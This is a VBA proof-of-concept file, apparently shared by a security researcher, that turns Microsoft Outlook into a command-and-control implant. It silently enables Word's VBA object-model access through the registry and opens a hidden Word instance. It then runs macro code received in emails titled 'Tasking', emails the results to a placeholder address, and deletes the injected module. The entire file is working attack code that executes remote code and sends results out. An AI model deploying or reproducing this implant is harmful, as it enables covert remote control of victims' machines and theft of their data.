 'Author: Jake Krasnov
 'Twitter: _Hubbl3
 'This is a basic POC demonstrating how VBA macros can turn Outlook into a C2
 'At startup a word document is opened that is used as the execution applicaiton for VBA routines sent as emails 
 'The code looks for an Email with the title of Tasking and then executes it 
 'The Tasking must define a StartTask and GetResults routine 
 
 
 
 Sub Application_Startup()
    'This routine generates the object that allows for interfacing with the inboxes
    'it automatically executed at startup. To use these event executions we have to
    'be in ThisOutlook Session
  
    Set outlookApp = Outlook.Application
    Set objectNS = outlookApp.GetNamespace("MAPI")
    
    'Enable VBA Project Access
    Ver = Application.Version
    Set ScriptShell = CreateObject("WScript.Shell")
    ScriptShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\" & Ver & "\Word\Security\AccessVBOM", 1, "REG_DWORD"
    
    'launch the word doc that will be the process responsible for executing our code
    'launches an instance of Microsoft word
    Set WordApp = CreateObject("Word.Application")
    Set ObjDoc = WordApp.Documents.Add
    'Sets the application visible for debugging
    'WordApp.Visible = True


End Sub

Sub Application_NewMail()
    'When a new email comes in execute
    
    'update the inbox items in our objects
    Set inboxItems = objectNS.GetDefaultFolder(olFolderInbox).Items
    Set Item = inboxItems(inboxItems.Count)
    
    If StrComp(Item.Subject, "Tasking", vbTextCompare) Then
        ExecuteTask Item.Body, WordApp
    End If

End Sub

Sub ExecuteTask(str As String, App As Object)
    

    'Adds a macro to the document
    Set xPro = App.ActiveDocument.VBProject
    Set module = xPro.VBComponents.Add(vbext_ct_StdModule)
    module.CodeModule.AddFromString (str)
    
    'Execute the module
    App.Run ("Module1.StartTask")
    
   'retrieve the results
    SendResults App
    
   
    
    
End Sub

Sub SendResults(App As Object)
    Dim res As String
    
    Set Msg = Application.CreateItem(olMailItem)
    res = App.Run("Module1.GetResults")
    
    Set xPro = App.ActiveDocument.VBProject
    'build email to return results from the Word tasking
    With Msg
        .To = "<receiving address>"
        .Subject = "Tasking Results"
        .Body = res
        .Send
    End With
    
    'Remove the Module
    xPro.VBComponents.Remove xPro.VBComponents("Module1")
End Sub